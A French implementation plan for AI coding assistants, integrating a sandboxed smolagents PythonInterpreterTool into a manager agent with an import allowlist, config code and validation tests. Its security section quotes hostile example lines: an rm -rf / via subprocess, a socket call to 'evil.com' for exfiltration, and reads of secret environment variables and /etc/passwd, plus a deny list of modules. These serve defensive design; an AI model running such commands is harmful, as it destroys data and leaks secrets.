# TOOL-PythonInterpreter — PythonInterpreterTool — Plan d'implémentation

> Document pour IA de codage (Claude Code, Cursor, Cline…)
> Lire AGENTS.md, LEARNING.md et PROGRESS.md avant de commencer.
> RÈGLE ABSOLUE : un checkpoint validé → commit → étape suivante.
> Python 3.14 — uv comme gestionnaire de paquets.
> ⚠️ SÉCURITÉ CRITIQUE : lire entièrement la section Sécurité avant de coder.

---

## RÔLE ET VALEUR AJOUTÉE

### Qu'est-ce que PythonInterpreterTool ?

`PythonInterpreterTool` est un built-in smolagents qui expose un **sandbox Python**
comme outil appelable par l'agent. Il permet d'exécuter du code Python dynamiquement
avec une liste d'imports autorisés contrôlée.

### N'est-ce pas redondant avec CodeAgent ?

**Non — ils servent des rôles différents :**

| | CodeAgent (natif) | PythonInterpreterTool |
|---|---|---|
| Qui génère le code | Le LLM lui-même | Le LLM, mais via un outil |
| Qui exécute | Le runtime CodeAgent | Un sandbox isolé |
| Imports contrôlés | Via `additional_authorized_imports` | Via `authorized_imports` |
| Appel par le Manager | Non (il est le Manager) | ✅ Oui, comme n'importe quel tool |
| Usage typique | Tâches complexes multi-steps | Calcul rapide, transformation, snippet |

**Cas d'usage concrets pour my-claw :**

```
1. CALCUL RAPIDE sans créer un sous-agent
   "Calcule la somme des tailles de tous les fichiers .py dans C:/projet"
   → Manager appelle python_interpreter(code="import os; ...")
   → Résultat immédiat sans délégation

2. TRANSFORMATION DE DONNÉES
   "Convertis cette liste JSON en CSV"
   → Code Python pur, exécution sandbox

3. VALIDATION DE SNIPPET
   "Est-ce que ce code Python est valide ?"
   → python_interpreter(code="...") → erreur ou résultat

4. FORMATAGE / REGEX
   "Extrait tous les emails de ce texte"
   → re.findall() en Python direct

5. CALCULS MATHÉMATIQUES COMPLEXES
   "Calcule les 50 premiers nombres premiers"
   → math, itertools — rapide, précis

6. MANIPULATION DE DATES
   "Combien de jours entre le 2025-03-15 et aujourd'hui ?"
   → datetime — sans dépendance externe
```

---

## CONTEXTE PROJET

### Architecture cible après ce TOOL

```
Manager (glm-4.7 / qwen3:8b)
├── UserInputTool            (Human-in-the-Loop)
├── PythonInterpreterTool    ← AJOUTÉ AU MANAGER (calcul/exec direct)
├── pc_control_agent         → qwen3-vl:2b
├── browser_agent            → Nanbeige4.1-3B + Chrome DevTools
└── web_agent                → Nanbeige4.1-3B + DDG + VisitWebpage
```

**Important :** PythonInterpreterTool va dans le Manager.
Il permet au Manager de faire des calculs/transformations SANS déléguer à un sous-agent,
ce qui est plus rapide et économise le contexte LLM.

### Paramètres clés (smolagents v1.24.0)

```python
PythonInterpreterTool(
    authorized_imports=None,   # None = aucun import autorisé (mode strict)
    timeout_seconds=30,        # timeout d'exécution
)
```

**`authorized_imports` est la clé de sécurité.**
Définir explicitement la liste des modules autorisés — jamais `None` en production.

---

## ⚠️ SECTION SÉCURITÉ — LIRE EN PREMIER

### Risques de PythonInterpreterTool

PythonInterpreterTool exécute du code Python généré par un LLM dans le processus
hôte. Sans `authorized_imports` restrictif, un LLM mal configuré ou un prompt
injection pourrait :

```python
# DANGERS si unauthorized_imports non restreint :
import subprocess; subprocess.run(["rm", "-rf", "/"])  # ← suppression
import socket; socket.connect(("evil.com", 4444))       # ← exfiltration
import os; os.environ["SECRET_KEY"]                     # ← vol de secrets
open("/etc/passwd").read()                              # ← lecture fichiers
```

### Liste d'imports autorisés — DÉFINIR STRICTEMENT

Pour un agent IA de codage, la liste safe minimale :

```python
SAFE_IMPORTS = [
    # Stdlib pure — calcul et données
    "math",
    "statistics",
    "decimal",
    "fractions",
    "random",
    # Texte et regex
    "re",
    "string",
    "textwrap",
    "unicodedata",
    # Dates et temps
    "datetime",
    "calendar",
    "time",
    # Collections et data structures
    "collections",
    "itertools",
    "functools",
    "heapq",
    "bisect",
    # Encodage / sérialisation (lecture seule)
    "json",
    "csv",
    "base64",
    "hashlib",
    "hmac",
    # Typage
    "typing",
    "dataclasses",
    "enum",
    # Utilitaires
    "copy",
    "pprint",
    "operator",
    "pathlib",   # ⚠️ lecture seule : interdire write si nécessaire
]
```

**Modules EXCLUS intentionnellement :**

| Module | Raison de l'exclusion |
|--------|----------------------|
| `os` | Accès système, suppression fichiers |
| `sys` | Modification runtime Python |
| `subprocess` | Exécution de commandes shell |
| `socket` | Connexions réseau |
| `shutil` | Opérations fichiers destructrices |
| `importlib` | Import dynamique de n'importe quoi |
| `ctypes` | Accès mémoire bas niveau |
| `pickle` | Désérialisation arbitraire |
| `exec` / `eval` | Évasion du sandbox |
| `builtins.__import__` | Contournement de la liste |

**Note :** smolagents implémente son propre sandbox (`LocalPythonInterpreter`)
qui bloque déjà certaines choses — mais `authorized_imports` reste la défense principale.

### Règle de production

```python
# ✅ CORRECT — liste explicite
PythonInterpreterTool(authorized_imports=SAFE_IMPORTS, timeout_seconds=30)

# ❌ DANGEREUX — tous les imports autorisés
PythonInterpreterTool(authorized_imports=["*"])

# ❌ DANGEREUX — aucune liste = comportement par défaut permissif selon version
PythonInterpreterTool()
```

---

## STRUCTURE FICHIERS À CRÉER / MODIFIER

```
agent/
├── main.py                         ← Modifier : /health + /models
├── skills.txt                      ← Modifier : ajouter skills calcul/exec
└── agents/
    └── manager_agent.py            ← Modifier : ajouter PythonInterpreterTool
```

**Optionnel (si config externalisée) :**
```
agent/
└── config/
    └── python_sandbox_config.py    ← Créer : liste SAFE_IMPORTS + factory
```

---

## ÉTAPE 1 — Vérifier les dépendances

### 1A — Import PythonInterpreterTool
```bash
cd agent
uv run python -c "from smolagents import PythonInterpreterTool; print('OK')"
```

### 1B — Test fonctionnel basique
```bash
uv run python -c "
from smolagents import PythonInterpreterTool

tool = PythonInterpreterTool(
    authorized_imports=['math', 'datetime', 'json'],
    timeout_seconds=10,
)

# Test calcul
result = tool(code='import math; print(math.pi ** 2)')
print(f'Résultat calcul : {result}')

# Test datetime
result2 = tool(code='import datetime; print(datetime.date.today())')
print(f'Résultat date : {result2}')

# Test import non autorisé (doit échouer proprement)
try:
    result3 = tool(code='import os; print(os.getcwd())')
    print(f'DANGER: import os autorisé — {result3}')
except Exception as e:
    print(f'OK: import os bloqué — {e}')
"
```

Attendu :
```
Résultat calcul : 9.869604401...
Résultat date : 2026-02-23
OK: import os bloqué — [message d'erreur smolagents]
```

**Checkpoint 1** : Calcul OK, import non autorisé bloqué.
Commit : `chore: vérification PythonInterpreterTool sandbox OK`

---

## ÉTAPE 2 — Créer config/python_sandbox_config.py

Externaliser la configuration du sandbox dans un fichier dédié
pour faciliter la maintenance et l'audit de sécurité.

### Code complet : agent/config/python_sandbox_config.py

```python
"""
Configuration du sandbox PythonInterpreterTool.

SÉCURITÉ : cette liste définit exactement ce que l'agent peut importer
lors d'une exécution Python dynamique. Modifier avec précaution.

Audit : vérifier régulièrement que les modules autorisés n'ont pas
acquis de nouvelles capacités dangereuses entre versions.

Python 3.14 : utiliser les nouvelles fonctionnalités stdlib si disponibles.
"""

from __future__ import annotations

# ── Imports autorisés pour le sandbox ─────────────────────────────────────────
# Chaque ajout ici est une surface d'attaque potentielle.
# Commenter la raison de chaque module pour faciliter les audits.

PYTHON_SANDBOX_ALLOWED_IMPORTS: list[str] = [
    # ── Mathématiques et calcul ──────────────────────────────────────────────
    "math",         # fonctions mathématiques de base (sin, cos, sqrt, pi...)
    "cmath",        # nombres complexes
    "statistics",   # mean, median, stdev...
    "decimal",      # arithmétique décimale précise
    "fractions",    # fractions exactes
    "random",       # génération pseudo-aléatoire

    # ── Texte et chaînes ─────────────────────────────────────────────────────
    "re",           # expressions régulières
    "string",       # constantes de chaînes (ascii_letters, digits...)
    "textwrap",     # formatage de texte
    "unicodedata",  # propriétés Unicode
    "difflib",      # comparaison de séquences

    # ── Dates et temps ────────────────────────────────────────────────────────
    "datetime",     # date, time, datetime, timedelta
    "calendar",     # calendrier, jours de la semaine
    "time",         # time.time(), time.sleep() — ⚠️ sleep limité par timeout

    # ── Structures de données ─────────────────────────────────────────────────
    "collections",  # Counter, defaultdict, OrderedDict, namedtuple, deque
    "itertools",    # chain, product, combinations, permutations...
    "functools",    # reduce, partial, lru_cache...
    "heapq",        # tas (heap) — tri efficace
    "bisect",       # recherche dichotomique
    "array",        # tableaux typés efficaces

    # ── Sérialisation (lecture/écriture mémoire — pas disque) ────────────────
    "json",         # sérialisation JSON
    "csv",          # parsing CSV (en mémoire via io.StringIO)
    "base64",       # encodage/décodage base64
    "hashlib",      # SHA256, MD5... — hashing
    "hmac",         # HMAC — vérification d'intégrité

    # ── I/O en mémoire (pas fichiers disque) ─────────────────────────────────
    "io",           # StringIO, BytesIO — buffers mémoire uniquement

    # ── Typage et structures Python ───────────────────────────────────────────
    "typing",       # Type, List, Dict, Optional... (utile pour analyse)
    "dataclasses",  # @dataclass
    "enum",         # Enum, IntEnum...
    "abc",          # classes abstraites

    # ── Utilitaires ───────────────────────────────────────────────────────────
    "copy",         # deepcopy, copy
    "pprint",       # pretty print
    "operator",     # opérateurs fonctionnels
    "contextlib",   # contextmanager, suppress...

    # ── Compression (lecture seule, en mémoire) ────────────────────────────
    "zlib",         # compression/décompression en mémoire
    "gzip",         # gzip en mémoire via io.BytesIO

    # ── Python 3.14 spécifiques ────────────────────────────────────────────
    # "annotationlib",  # introspection des annotations (nouveau en 3.14) — à tester
]

# ── Timeout d'exécution ────────────────────────────────────────────────────────
# 30 secondes : suffisant pour la quasi-totalité des cas d'usage
# Augmenter seulement pour des calculs intensifs identifiés
PYTHON_SANDBOX_TIMEOUT_SECONDS: int = 30

# ── Description de l'outil pour le Manager ───────────────────────────────────
PYTHON_INTERPRETER_DESCRIPTION: str = (
    "Exécute du code Python dans un sandbox sécurisé. "
    "Modules autorisés : math, statistics, re, json, csv, datetime, "
    "collections, itertools, base64, hashlib, io. "
    "INTERDIT : os, subprocess, socket, sys, shutil, importlib. "
    "Utiliser pour : calculs, regex, parsing JSON/CSV, manipulation de dates, "
    "transformations de données. "
    "Limite : 30 secondes, pas d'accès fichiers disque ni réseau."
)

# ── Factory function ─────────────────────────────────────────────────────────

def create_python_interpreter_tool():
    """
    Crée un PythonInterpreterTool avec la configuration sécurisée.

    Returns:
        PythonInterpreterTool configuré avec PYTHON_SANDBOX_ALLOWED_IMPORTS.

    Note Python 3.14 :
        Le type de retour n'est pas annoté explicitement car PythonInterpreterTool
        est un objet smolagents dynamique. Utiliser TYPE_CHECKING si nécessaire.
    """
    from smolagents import PythonInterpreterTool

    tool = PythonInterpreterTool(
        authorized_imports=PYTHON_SANDBOX_ALLOWED_IMPORTS,
        timeout_seconds=PYTHON_SANDBOX_TIMEOUT_SECONDS,
    )

    # Surcharger la description pour guider le Manager
    tool.description = PYTHON_INTERPRETER_DESCRIPTION

    return tool


def audit_sandbox_imports() -> dict[str, list[str]]:
    """
    Vérifie quels modules de la liste sont effectivement importables.
    Utile pour le diagnostic au démarrage.

    Returns:
        dict avec 'available' et 'missing' (modules non installés)
    """
    import importlib.util

    available: list[str] = []
    missing: list[str] = []

    for module_name in PYTHON_SANDBOX_ALLOWED_IMPORTS:
        spec = importlib.util.find_spec(module_name)
        if spec is not None:
            available.append(module_name)
        else:
            missing.append(module_name)

    return {"available": available, "missing": missing}
```

---

## ÉTAPE 3 — Modifier manager_agent.py

### 3A — Import et ajout au Manager

```python
# Dans agent/agents/manager_agent.py

from config.python_sandbox_config import create_python_interpreter_tool, audit_sandbox_imports
from smolagents import UserInputTool  # si déjà implémenté

import logging
logger = logging.getLogger(__name__)

def create_manager_agent(
    ollama_url: str,
    managed_agents: list,
    model_id: str = "...",
) -> "CodeAgent":
    from smolagents import CodeAgent, LiteLLMModel

    model = LiteLLMModel(
        model_id=f"ollama_chat/{model_id}",
        api_base=ollama_url,
        num_ctx=8192,
    )

    # ── Audit sandbox au démarrage ────────────────────────────────────────
    sandbox_audit = audit_sandbox_imports()
    if sandbox_audit["missing"]:
        logger.warning(f"Sandbox : modules non disponibles : {sandbox_audit['missing']}")
    logger.info(f"✓ Sandbox Python : {len(sandbox_audit['available'])} modules autorisés")

    # ── Instanciation des tools directs du Manager ─────────────────────────
    manager_tools = [
        UserInputTool(),                    # Human-in-the-Loop
        create_python_interpreter_tool(),   # ← TOOL-PythonInterpreter
    ]
    logger.info(f"✓ Manager tools : {[t.name for t in manager_tools]}")

    # ── Création du Manager ───────────────────────────────────────────────
    manager = CodeAgent(
        tools=manager_tools,
        managed_agents=managed_agents,
        model=model,
        name="manager",
        description="Agent manager principal de my-claw.",
        system_prompt=_MANAGER_SYSTEM_PROMPT,  # voir 3B
        max_steps=15,
        verbosity_level=1,
    )

    logger.info("✓ Manager créé avec UserInputTool + PythonInterpreterTool")
    return manager
```

### 3B — Instructions système du Manager pour PythonInterpreterTool

Ajouter dans `_MANAGER_SYSTEM_PROMPT` (section dédiée) :

```python
_MANAGER_PYTHON_INTERPRETER_SECTION = """
── CALCUL ET EXÉCUTION PYTHON : python_interpreter ─────────────────────────

QUAND utiliser python_interpreter(code="...") :
1. Calculs mathématiques précis (math, statistics, decimal)
2. Manipulation de regex sur du texte (re)
3. Parsing et transformation JSON/CSV (json, csv, io.StringIO)
4. Calculs de dates et durées (datetime, calendar)
5. Opérations sur des collections (collections, itertools)
6. Encodage/hashing (base64, hashlib)
7. Tout calcul qui peut se faire en Python stdlib en < 30 secondes

QUAND NE PAS utiliser python_interpreter :
- Accès fichiers disque → utiliser FileSystemTool (TOOL-1)
- Exécution de commandes système → utiliser OSPowerShellTool (TOOL-2)
- Accès réseau → utiliser web_agent (TOOL-4/5)
- Tâche longue et complexe → déléguer à un sous-agent spécialisé

MODULES AUTORISÉS :
math, cmath, statistics, decimal, fractions, random,
re, string, textwrap, unicodedata, difflib,
datetime, calendar, time, collections, itertools,
functools, heapq, bisect, array,
json, csv, base64, hashlib, hmac, io,
typing, dataclasses, enum, abc,
copy, pprint, operator, contextlib,
zlib, gzip

MODULES INTERDITS (lèvent une erreur de sandbox) :
os, sys, subprocess, socket, shutil, importlib, ctypes, pickle

EXEMPLES CORRECTS :
```python
# Calcul mathématique
result = python_interpreter(code="""
import math
import statistics

valeurs = [23.5, 18.2, 31.7, 25.1, 19.8]
print(f"Moyenne: {statistics.mean(valeurs):.2f}")
print(f"Écart-type: {statistics.stdev(valeurs):.2f}")
print(f"Max: {max(valeurs)}")
""")
final_answer(result)

# Parsing JSON + regex
result = python_interpreter(code="""
import json
import re

data = json.loads('{\"emails\": \"contact@example.com, support@test.fr\"}')
emails = re.findall(r'[\\w.+-]+@[\\w-]+\\.[\\w.]+', data['emails'])
print(emails)
""")
final_answer(result)

# Calcul de dates
result = python_interpreter(code="""
from datetime import date, timedelta

today = date.today()
target = date(2026, 12, 31)
delta = target - today
print(f"Jours restants en 2026 : {delta.days}")
""")
final_answer(result)
```

ANTI-PATTERNS À ÉVITER :
```python
# ❌ Ne pas tenter des imports non autorisés
result = python_interpreter(code="import os; print(os.listdir('.'))")
# → lève une erreur sandbox

# ❌ Ne pas utiliser pour l'accès fichiers (utiliser FileSystemTool)
result = python_interpreter(code="open('config.txt').read()")
# → peut fonctionner ou non selon le sandbox — utiliser TOOL-1 à la place

# ❌ Ne pas générer de boucles infinies
result = python_interpreter(code="while True: pass")
# → timeout au bout de 30 secondes
```
"""
```

---

## ÉTAPE 4 — Modifier main.py

### 4A — Mettre à jour /health

```python
@app.get("/health")
async def health():
    from config.python_sandbox_config import audit_sandbox_imports
    sandbox_audit = audit_sandbox_imports()

    return {
        "status": "ok",
        "module": "2-multi-agent",
        "agents": {
            "pc_control": _pc_control_agent is not None,
            "browser": _browser_agent is not None,
            "web_search": _web_search_agent is not None,
        },
        "manager_tools": {
            "user_input": True,
            "python_interpreter": True,
            "python_sandbox_modules": len(sandbox_audit["available"]),
            "python_sandbox_missing": sandbox_audit.get("missing", []),
        },
    }
```

### 4B — Mettre à jour /models

```python
@app.get("/models")
async def models():
    return {
        "manager": {
            "model": "glm-4.7 ou qwen3:8b",
            "direct_tools": [
                "UserInputTool (human-in-the-loop)",
                "PythonInterpreterTool (sandbox: math, re, json, datetime...)",
            ],
        },
        "sub_agents": {
            "pc_control": "qwen3-vl:2b + screenshot/vision/grounding/mouse_keyboard",
            "browser": f"Nanbeige4.1-3B + Chrome DevTools MCP",
            "web_search": "Nanbeige4.1-3B + DuckDuckGoSearchTool + VisitWebpageTool",
        },
    }
```

**Checkpoint 4** : Démarrer le serveur, vérifier les logs :
```
✓ Sandbox Python : 30 modules autorisés
✓ Manager tools : ['user_input', 'python_interpreter']
✓ Manager créé avec UserInputTool + PythonInterpreterTool
```
Commit : `feat(python-interpreter): sandbox configuré dans Manager`

---

## ÉTAPE 5 — Tests de validation

### 5A — Test calcul mathématique basique
Via Gradio :
```
Calcule la somme des 100 premiers nombres premiers
```
Attendu en logs :
```
Manager → python_interpreter(code="...")
→ résultat numérique retourné
→ final_answer(24133)
```

### 5B — Test regex sur texte
```
Extrait tous les numéros de téléphone français de ce texte :
"Contact : 06 12 34 56 78 ou +33 1 23 45 67 89, urgent : 07.89.01.23.45"
```
Attendu : liste des numéros extraits via `re.findall`.

### 5C — Test parsing JSON
```
Quelle est la valeur moyenne du champ 'score' dans ce JSON ?
[{"nom": "Alice", "score": 85}, {"nom": "Bob", "score": 92}, {"nom": "Charlie", "score": 78}]
```
Attendu : calcul `statistics.mean()` sur les scores → 85.0.

### 5D — Test calcul de dates
```
Combien de jours depuis le 1er janvier 2025 ?
```
Attendu : `datetime.date.today() - datetime.date(2025, 1, 1)` → nombre de jours correct.

### 5E — Test import non autorisé (sécurité)
```
Dis-moi le contenu de mon répertoire courant
```
Attendu : le Manager soit utilise FileSystemTool (TOOL-1), soit le `python_interpreter`
essaie `os.listdir()` et reçoit une erreur sandbox propre — puis se rabat sur TOOL-1.
Ne doit **pas** réussir à lister via `os` dans le sandbox.

### 5F — Test timeout
```
Calcule tous les nombres premiers jusqu'à 10 milliards
```
Attendu : timeout après 30 secondes avec message d'erreur clair, pas un freeze.

### 5G — Test délégation correcte (ne pas utiliser pour fichiers)
```
Lis le contenu du fichier config.json
```
Attendu : le Manager utilise FileSystemTool (TOOL-1), pas `python_interpreter`.

### 5H — Vérification /health
```bash
curl http://localhost:8000/health | python -m json.tool
```
Attendu :
```json
{
  "manager_tools": {
    "python_interpreter": true,
    "python_sandbox_modules": 30
  }
}
```

Commit : `feat: PythonInterpreterTool — sandbox validé`

---

## ÉTAPE 6 — Ajouter les skills dans skills.txt

```
── PythonInterpreterTool : Calcul et Transformation Python ─────────────────

SKILL 20 : Calculs mathématiques et statistiques
Pour tout calcul numérique précis, utiliser python_interpreter avec math ou statistics.
Modules disponibles : math, cmath, statistics, decimal, fractions, random.

Exemples :
- "Calcule la moyenne et l'écart-type de [1.2, 3.4, 2.1, 4.5]"
- "Quel est le PGCD de 1848 et 3024 ?" → math.gcd()
- "Calcule 2 à la puissance 1000" → math directement

SKILL 21 : Regex et manipulation de texte
Pour extraire des patterns ou transformer du texte :
Modules disponibles : re, string, textwrap, unicodedata, difflib.

Exemples :
- "Extrait tous les emails de ce texte"
- "Remplace tous les numéros de téléphone par [REDACTED]"
- "Compte les occurrences de chaque mot dans ce paragraphe"

SKILL 22 : Parsing et transformation JSON / CSV
Pour analyser ou transformer des données structurées en mémoire :
Modules disponibles : json, csv, io (StringIO/BytesIO).

Exemples :
- "Trie ces données JSON par le champ 'date'"
- "Convertis ce CSV (texte) en liste de dicts Python"
- "Calcule la somme du champ 'montant' dans ce JSON"

SKILL 23 : Calculs de dates et durées
Pour toute opération temporelle :
Modules disponibles : datetime, calendar, time.

Exemples :
- "Combien de jours entre deux dates ?"
- "Quel jour de la semaine est le 14 juillet 2027 ?"
- "Ajoute 90 jours ouvrés à aujourd'hui" → avec calendar

SKILL 24 : Encodage et hashing
Pour encoder/hasher des données :
Modules disponibles : base64, hashlib, hmac.

Exemples :
- "Encode cette chaîne en base64"
- "Calcule le SHA256 de ce texte"

RÈGLES DE DÉLÉGATION :
✅ Utiliser python_interpreter : calcul pur, regex, JSON/CSV en mémoire, dates
❌ Ne PAS utiliser pour : accès fichiers (→ TOOL-1), commandes système (→ TOOL-2),
   web (→ TOOL-4/5), interactions Chrome (→ browser_agent)

MODULES INTERDITS (lèvent une erreur) :
os, sys, subprocess, socket, shutil, importlib, ctypes, pickle
```

---

## ÉTAPE 7 — Mettre à jour PROGRESS.md et LEARNING.md

### PROGRESS.md

```markdown
### PythonInterpreterTool — Calcul et Transformation Python
**Statut : ✅ DONE**

Intégration :
- Ajouté dans tools[] du Manager directement (avec UserInputTool)
- Liste authorized_imports explicite (30 modules stdlib safe) dans config/python_sandbox_config.py
- Modules exclus : os, sys, subprocess, socket, shutil, importlib, ctypes, pickle
- Timeout : 30 secondes

Cas d'usage validés :
- ✅ Calcul somme premiers nombres premiers
- ✅ Regex extraction emails/téléphones
- ✅ Parsing JSON + statistics.mean()
- ✅ Calcul datetime
- ✅ Import os bloqué par sandbox
- ✅ Timeout 30s propre
- ✅ Délégation correcte TOOL-1 pour accès fichiers

Commit : feat: PythonInterpreterTool — sandbox validé
```

### LEARNING.md

```markdown
## PythonInterpreterTool — Sandbox Python (2026-02-23)

### Placement : Manager direct, pas sous-agent

Même principe que UserInputTool : le Manager peut calculer/transformer
sans déléguer, ce qui est plus rapide et économise le contexte LLM.
Un sous-agent Nanbeige4.1-3B pour "calcule le SHA256 de cette chaîne"
serait du overhead inutile.

### authorized_imports = liste explicite TOUJOURS

Ne jamais laisser authorized_imports=None en production.
Externaliser la liste dans config/python_sandbox_config.py pour audit facile.

Ajout d'un module = PR + commentaire justifiant l'ajout.

### audit_sandbox_imports() au démarrage

Vérifier au startup que tous les modules de la liste sont disponibles.
Loguer les manquants comme warning (peut arriver avec un environnement minimal).

### Deux niveaux de défense

1. authorized_imports → contrôle au niveau smolagents (avant exécution)
2. timeout_seconds=30 → arrêt forcé si boucle infinie ou calcul trop long

### Python 3.14 — nouveaux modules stdlib potentiels

Vérifier si Python 3.14 expose de nouveaux modules stdlib utiles.
Candidat : annotationlib (introspection des annotations) — tester compatibilité
avec le sandbox avant ajout à PYTHON_SANDBOX_ALLOWED_IMPORTS.

### Ne pas confondre avec CodeAgent natif

CodeAgent génère et exécute son propre code — c'est son mode de fonctionnement.
PythonInterpreterTool est un outil *appelable* par un agent (Manager inclus)
pour des calculs ponctuels sans créer un nouveau cycle d'inférence LLM.
```

---

## RÉCAPITULATIF ORDRE D'IMPLÉMENTATION

```
⚠️  Lire entièrement la section SÉCURITÉ avant de coder
──────────────────────────────────────────────────────────────────
ÉTAPE 1  Vérifier import + test sandbox bloque os
ÉTAPE 2  Créer agent/config/python_sandbox_config.py
         (SAFE_IMPORTS, factory, audit)
ÉTAPE 3  Modifier manager_agent.py
         → Importer create_python_interpreter_tool()
         → Ajouter dans manager_tools[]
         → Ajouter section instructions système
ÉTAPE 4  Modifier main.py
         → /health : python_sandbox_modules count
         → /models : afficher direct_tools du Manager
ÉTAPE 5  Tests de validation (5A → 5H)
ÉTAPE 6  Ajouter skills 20-24 dans skills.txt
ÉTAPE 7  Mettre à jour PROGRESS.md et LEARNING.md
──────────────────────────────────────────────────────────────────
→ CHECKPOINT FINAL validé → commit → prochaine feature
```

---

## NOTES IMPORTANTES POUR L'IA DE CODAGE

1. **SÉCURITÉ PRIORITAIRE** : authorized_imports doit être la liste SAFE_IMPORTS — jamais None
2. **Placement** : PythonInterpreterTool dans le Manager, pas dans les sous-agents
3. **Externaliser** la config dans `config/python_sandbox_config.py` — pas de liste inline dans manager_agent.py
4. **audit_sandbox_imports()** à appeler dans le lifespan startup pour détecter les manquants
5. **timeout_seconds=30** — ne pas augmenter sans raison documentée
6. **Modules exclus** : os, sys, subprocess, socket, shutil, importlib, ctypes, pickle — jamais les ajouter
7. **Délégation** : si l'agent doit accéder à des fichiers → TOOL-1 FileSystem, pas python_interpreter
8. **Python 3.14** : `from __future__ import annotations`, `X | None`, f-strings imbriquées OK
9. **uv** est le gestionnaire de paquets — pas pip directement
10. **Ne pas modifier** TOOL-1/2/3/4/5/7/8/9/10 — validés et stables
11. **config/** : créer le dossier `agent/config/__init__.py` vide si inexistant
12. **Test 5E** (import os bloqué) doit **passer** avant de valider — c'est le test de sécurité critique
